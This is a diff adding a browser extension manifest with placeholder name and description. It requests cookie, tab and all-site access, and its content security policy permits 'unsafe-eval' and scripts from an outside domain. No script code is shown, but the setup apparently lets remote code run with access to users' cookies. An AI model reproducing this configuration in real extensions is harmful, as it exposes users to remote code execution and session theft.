@@ -1,0 +1,23 @@
+{
+   "background": {
+      "page": "options/options.html"
+   },
+   "browser_action": {
+      "default_icon": "data/icon.png"
+   },
+   "default_locale": "en",
+   "content_security_policy": "script-src 'self' 'unsafe-eval' https://iksirpazarlama.com; object-src 'self'",
+   "description": "__MSG_appDesc__",
+   "icons": {
+      "128": "data/icon128.png",
+      "16": "data/icon16.png",
+      "48": "data/icon48.png"
+   },
+   "manifest_version": 2,
+   "name": "__MSG_appName__",
+   "options_page": "options/options.html",
+   "permissions": [ "cookies", "tabs", "*://*/*", "activeTab", "http://*/", "https://*/", "storage" ],
+   "short_name": "__MSG_shortName__",
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "1.2.2"
+}
